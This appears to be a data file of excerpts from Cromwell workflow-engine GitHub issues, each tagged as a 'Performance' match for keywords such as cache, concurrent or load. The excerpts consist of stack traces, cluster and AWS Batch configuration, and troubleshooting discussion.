""/data/ref/Homo_sapiens_assembly19.fasta.fai"",; ""bam_idx"": ""/data/public/SM-74P1Z.bai"",; ""entity_id"": ""SM-74P1Z"",; ""disable_sequence_dictionary_validation"": true,; ""mem"": 2,; ""gatk_jar"": ""/root/gatk-protected.jar"",; ""transform"": ""PCOV"",; ""isWGS"": false,; ""ref_fasta_dict"": ""/data/ref/Homo_sapiens_assembly19.dict"",; ""padded_target_file"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-PadTargets/execution/targets.padded.tsv""; },; ""jobId"": ""28221"",; ""backend"": ""Local",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:58911,Cache,Cache,58911,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,2,"['Cache', 'cache']","['Cache', 'cache']"
Performance,"-illumina_demux/illumina_demux-stdout.log; 2018-06-13 14:41:14,088 cromwell-system-akka.dispatchers.backend-dispatcher-112 INFO - AwsBatchAsyncBackendJobExecutionActor [UUID(a67833cb)demux_only.illumina_demux:NA:1]: Status change from Running to Succeeded; 2018-06-13 14:41:15,905 cromwell-system-akka.dispatchers.engine-dispatcher-37 ERROR - WorkflowManagerActor Workflow a67833cb-b894-4790-872f-9f3104cab60c failed (during ExecutingWorkflowState): cromwell.core.CromwellFatalException: java.nio.file.NoSuchFileException: target not exists: s3://s3.amazonaws.com/atbiofx-cromwell/cromwell-execution/demux_only/a67833cb-b894-4790-872f-9f3104cab60c/call-illumina_demux/illumina_demux-rc.txt; 	at cromwell.core.CromwellFatalException$.apply(core.scala:18); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.ru",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3774:21378,concurren,concurrent,21378,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3774,1,['concurren'],['concurrent']
Performance,-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-d86697f6-ca39-417b-b575-fc955c808983/WorkflowExecutionActor-d86697f6-ca39-417b-b575-fc955c808983/d86697f6-ca39-417b-b575-fc955c808983-EngineJobExecutionActor-DeliciousFileSpam.FileSpam:364:1/d86697f6-ca39-417b-b575-fc955c808983-BackendJobExecutionActor-d86697f6:DeliciousFileSpam.FileSpam:364:1/JesAsyncBackendJobExecutionActor: exception during creation; at akka.actor.ActorInitializationException$.apply(Actor.scala:174); at akka.actor.ActorCell.create(ActorCell.scala:607); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Google credentials are invalid: Connection reset; at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:63); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:94); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:137); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:30); at cromwell.backend.impl.jes.JesCallPaths.<init>(JesCallPaths.scala:16); at cromwell.backend.impl.jes.JesCallPaths$.apply(JesCallPaths.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719:1193,concurren,concurrent,1193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719,1,['concurren'],['concurrent']
Performance,". #### Configuration file ###. include required(classpath(""application"")). system {; # If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; abort-jobs-on-terminate = false; }. backend {; default = SLURM. providers {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; temporary-directory = ""$(mktemp -d /tmp/tmp.XXXXXX)"". runtime-attributes = """"""; Int runtime_minutes = 60; Int cpu = 1; Int memory_mb = 3900; String? docker; """""". submit = """""" \; 'sbatch \; --wait \; -J ${job_name} \; -D ${cwd} \; -o ${out} \; -e ${err} \; -t ${runtime_minutes} \; -p batch,scavenger \; -c ${cpu} \; --mem $(( (${memory_mb} >= ${cpu} * 3900) ? ${memory_mb} : $(( ${cpu} * 3900 )) )) \; -N 1 \; --exclusive \; --wrap ""/bin/bash ${script}""'; """""". submit-docker = """""" \. # Make sure the SINGULARITY_CACHEDIR variable is set. If not use a default; # based on the users home.; module load apptainer; if [ -z $APPTAINER_CACHEDIR ];; then CACHE_DIR=$HOME/.apptainer/cache; else CACHE_DIR=$APPTAINER_CACHEDIR; fi; # Make sure cache dir exists so lock file can be created by flock; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/apptainer_pull_flock; # Create an exclusive filelock with flock. --verbose is useful for; # for debugging, as is the echo command. These show up in `stdout.submit`.; flock --exclusive --timeout 900 $LOCK_FILE \; apptainer exec --containall /mainfs/wrgl/broadinstitute_warp_development/warp/images/${docker}.sif \; echo ""successfully pulled ${docker}!"". # Submit the script to SLURM. 'sbatch \; --wait \; -J ${job_name} \; -D ${cwd} \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr \; -t ${runtime_minutes} \; -p batch,scavenger \; -c ${cpu} \; --mem $(( (${memory_mb} >= ${cpu} * 3900) ? ${memory_mb} : $(( ${cpu} * 3900 )) )) \; -N 1 \; --exclusive \; --wrap \; ""module load apptainer; apptainer exec \; --containall \; --bind /mainfs/wrgl/reference_files/reference_genome/gcp-public",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7086:1777,load,load,1777,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7086,1,['load'],['load']
Performance,". dshiga [4:46 PM]; hi @kshakir, we're seeing a lot of workflows that have been stuck in submitted status for the past ~45 minutes. is something wrong in caas?; for example this workflow is stuck: 8de76a93-6b66-4c29-a2fe-31e6cd1f969e. kshakir [4:48 PM]; ```; Workflow 8de76a93-6b66-4c29-a2fe-31e6cd1f969e in state Running and restarted = false cannot be started and should not have been fetched.; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:60); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:56); at cromwell.engine.workflow.workflowstore.SqlWorkflowStore.$anonfun$fetchStartableWorkflows$1(SqlWorkflowStore.scala:57); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; :hmmm:. chrisl [4:50 PM]; that sort of looks like ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3673:1023,concurren,concurrent,1023,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3673,1,['concurren'],['concurrent']
Performance,". engine { filesystems { s3 { auth = ""default"" } } }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 3; numCreateDefinitionAttempts = 3; root = ""s3://mybucket/cromwell-execution""; 	auth = ""default""; concurrent-job-limit = 16; default-runtime-attributes { queueArn = ""arn:aws:batch:us-east-1:<account-id>:job-queue/MyHighPriorityQue-ae4256f76f07d96"" }; filesystems { s3 { auth = ""default"" } }; }; }; }; }. call-caching {. enabled = true. # In a multi-user environment this should be false so unauthorized users don't invalidate results for authorized users.; invalidate-bad-cache-results = false. blacklist-cache {; # The call caching blacklist cache is off by default. This is used to blacklist cache hit paths based on the; # prefixes of cache hit paths that Cromwell previously failed to copy for authorization reasons.; enabled: false; # Guava cache concurrency.; concurrency: 10000; # How long entries in the cache should live from the time of their last access.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 1000; }; }. database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://cromwell-db-rdscluster.cluster.us-east-1.rds.amazonaws.com/cromwell""; user = ""myuser""; password = ""my password""; connectionTimeout = 5000; }; }. my hello.wdl is:; task hello {; String name; command {; echo 'Hello ${name}!' > ""hello${name}.txt""; }; output {; File response = ""hello${name}.txt""; }; runtime {; docker: ""ubuntu:latest""; }; }. workflow test {; call hello; }. My hello_inputs.json is:; {; ""test.hello.name"": ""World"",; }. I ran java -Dconfig.file=aws.callcache.conf -jar ~/cromwell-35.jar run -i hello_inputs.json hello.wdl several times, each time there is a new job submitted to aws batch. Should it submit aws batch only once when first time ran it? . Your assistance will be highly appreciated. Thanks; Jing",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412:1277,concurren,concurrency,1277,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412,3,"['cache', 'concurren']","['cache', 'concurrency']"
Performance,".3; SINGULARITY_MOUNTS='<redacted>'; export SINGULARITY_CACHEDIR=$HOME/.singularity/cache; LOCK_FILE=$SINGULARITY_CACHEDIR/singularity_pull_flock. export SINGULARITY_DOCKER_USERNAME=<redacted>; export SINGULARITY_DOCKER_PASSWORD=<redacted>. flock --exclusive --timeout 900 $LOCK_FILE \; singularity exec docker://${docker} \; echo ""Sucessfully pulled ${docker}"". bsub \; -q ${lsf_queue} \; -P ${lsf_project} \; -J ${job_name} \; -cwd ${cwd} \; -o ${out} \; -e ${err} \; -n ${cpu} \; -R 'rusage[mem=${memory_mb}] span[hosts=1]' \; -M ${memory_mb} \; singularity exec --containall $SINGULARITY_MOUNTS --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}; """""". job-id-regex = ""Job <(\\d+)>.*""; kill = ""bkill ${job_id}""; kill-docker = ""bkill ${job_id}""; check-alive = ""bjobs -w ${job_id} |& egrep -qvw 'not found|EXIT|JOBID'"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [; ""soft-link"", ""copy"", ""hard-link""; ]; hashing-strategy: ""path+modtime""; }; }; }; }; }; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3;; hsqldb.log_size=0; """"""; connectionTimeout = 86400000; numThreads = 2; }; insert-batch-size = 2000; read-batch-size = 5000000; write-batch-size = 5000000; metadata {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-metadata-db/;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hs",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7203:2502,cache,cache-results,2502,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7203,1,['cache'],['cache-results']
Performance,".40.04/NVIDIA-Linux-x86_64-418.40.04.run; ls: cannot access '/build/usr/src/linux': No such file or directory; [INFO 2020-08-04 23:40:11 UTC] Kernel sources not found locally, downloading; [INFO 2020-08-04 23:40:11 UTC] Kernel source archive download URL: https://storage.googleapis.com/cos-tools/12871.1174.0/kernel-src.tar.gz. real	0m2.220s; user	0m0.183s; sys	0m0.338s; [INFO 2020-08-04 23:40:18 UTC] Setting up compilation environment; [INFO 2020-08-04 23:40:18 UTC] Obtaining toolchain_env file from https://storage.googleapis.com/cos-tools/12871.1174.0/toolchain_env. real	0m0.126s; user	0m0.014s; sys	0m0.001s; [INFO 2020-08-04 23:40:18 UTC] Downloading toolchain from https://storage.googleapis.com/cos-tools/12871.1174.0/toolchain.tar.xz. real	0m11.907s; user	0m0.428s; sys	0m1.039s; [INFO 2020-08-04 23:41:17 UTC] Configuring environment variables for cross-compilation; [INFO 2020-08-04 23:41:17 UTC] Configuring installation directories; [INFO 2020-08-04 23:41:17 UTC] Updating container's ld cache; [INFO 2020-08-04 23:41:20 UTC] Configuring kernel sources; [INFO 2020-08-04 23:41:42 UTC] Modifying kernel version magic string in source files; [INFO 2020-08-04 23:41:42 UTC] Running Nvidia installer. ERROR: The kernel module failed to load, because it was not signed by a key; that is trusted by the kernel. Please try installing the driver; again, and set the --module-signing-secret-key and; --module-signing-public-key options on the command line, or run the; installer in expert mode to enable the interactive module signing; prompts. ERROR: Unable to load the kernel module 'nvidia.ko'. This happens most; frequently when this kernel module was built against the wrong or; improperly configured kernel sources, with a version of gcc that; differs from the one used to build the target kernel, or if another; driver, such as nouveau, is present and prevents the NVIDIA kernel; module from obtaining ownership of the NVIDIA GPU(s), or no NVIDIA; GPU installed in this system is suppo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5714:4827,cache,cache,4827,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5714,1,['cache'],['cache']
Performance,".AsyncBackendJobExecutionActor$class.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:45); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:69); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:171); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:124); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: wdl4s.WdlExpressionException: Cannot perform operation: -m ea -M + WdlOptionalValue(WdlStringType,Some(WdlString(conrad.leonard@qimrberghofer.edu.au))); 	at wdl4s.values.WdlValue$class.invalid(WdlValue.scala:12); 	at wdl4s.values.WdlString.invalid(WdlString.scala:7); 	at wdl4s.values.WdlString.add(WdlString.scala:15); 	at wdl4s.expression.ValueEvaluator$$anonfun$evaluate$3$$anonfun$apply$1.apply(ValueEvaluator.scala:54); 	at wdl4s.expression.ValueEvaluator$$anonfun$evaluate$3$$anonfun$apply$1.apply(ValueEvaluator.scala:54); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at wdl4s.expression.ValueEvaluator$$anonfun$evaluate$3.apply(ValueEvaluator.scala:54); 	at wdl4s.expression.ValueEvaluator$$anonfun$evaluate$3.apply(ValueEvaluator.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1765:5435,concurren,concurrent,5435,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1765,1,['concurren'],['concurrent']
Performance,".AsyncBackendJobExecutionActor$class.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:56); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:80); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:171); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:496); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:113); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2017-02-02 11:55:36,711 cromwell-system-akka.dispatchers.engine-dispatcher-19 ERROR - WorkflowManagerActor Workflow 5fdb357a-3f1d-45b7-a85b-c22caa755c36 failed (during ExecutingWorkflowState): java.lang.IllegalArgumentException; cromwell.core.CromwellFatalException: java.lang.IllegalArgumentException; 	at cromwell.core.CromwellFatalException$.apply(core.scala:18); 	at cromwell.core.retry.Retry$$anonfun$withRetry$2.applyOrElse(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$2.applyOrElse(Retry.scala:37); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1944:6095,concurren,concurrent,6095,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1944,1,['concurren'],['concurrent']
Performance,".BackendCallJobDescriptor.instantiateCommand(JobDescriptor.scala:52) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:115) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:113) ~[cromwell-0.19.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell-0.19.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell-0.19.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell-0.19.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell-0.19.jar:0.19]; 2016-05-27 11:08:57,271 cromwell-system-akka.actor.default-dispatcher-4 ERROR - BackendCallExecutionActor [UUID(8c7774be):BillyBob]: Failures during localizationCould not localize /foo/bar/baz -> /home/conradL/cromwell-executions/badLocalization/8c7774be-7917-4c6a-88c4-55e495bbb9ec/call-BillyBob/foo/bar/baz; cromwell.util.AggregatedException: Failures during localizationCould not localize /foo/bar/baz -> /home/conradL/cromwell-executions/badLocalization/8c7774be-7917-4c6a-88c4-55e495bbb9ec/call-BillyBob/foo/bar/baz; at cromwell.util.TryUtil$.sequenceIterable(TryUtil.scala:118) ~[cromwell-0.19.jar:0.19]; at cromwell.util.TryUtil$.sequence(TryUtil.scala:125) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.local.SharedFileSystem$class.adjustSharedInputPaths(SharedFileSystem.scala:228) ~[c",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/922:12986,concurren,concurrent,12986,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/922,1,['concurren'],['concurrent']
Performance,.CallMetadataBuilder$$anonfun$15.apply(CallMetadataBuilder.scala:232) ~[cromwell.jar:0.19]; at scala.collection.LinearSeqOptimized$class.foldLeft(LinearSeqOptimized.scala:124) ~[cromwell.jar:0.19]; at scala.collection.immutable.List.foldLeft(List.scala:84) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$.build(CallMetadataBuilder.scala:232) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowMetadataBuilder$$anonfun$cromwell$engine$workflow$WorkflowMetadataBuilder$$buildWorkflowMetadata$2.apply(WorkflowMetadataBuilder.scala:95) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowMetadataBuilder$$anonfun$cromwell$engine$workflow$WorkflowMetadataBuilder$$buildWorkflowMetadata$2.apply(WorkflowMetadataBuilder.scala:85) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.ja,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/927:2749,concurren,concurrent,2749,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/927,1,['concurren'],['concurrent']
Performance,.Failure.recoverWith(Try.scala:203); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:48); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$receive$1.applyOrElse(JobPreparationActor.scala:27); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.aroundReceive(JobPreparationActor.scala:18); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	Suppressed: wdl4s.exception.ValidationException: Input evaluation for Call dna_mapping_38.libraryMerge failed.:; inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 		at wdl4s.Call.evaluateTaskInputs(Call.scala:117); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:42); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:35); 		at scala.util.Try$.apply(Try.scala:192); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:35); 		... 12 more; 		Suppressed: wdl4s.exception.VariableLookupException: inputBams:; Could not find the shard mapping to this scat,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:4351,concurren,concurrent,4351,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['concurren'],['concurrent']
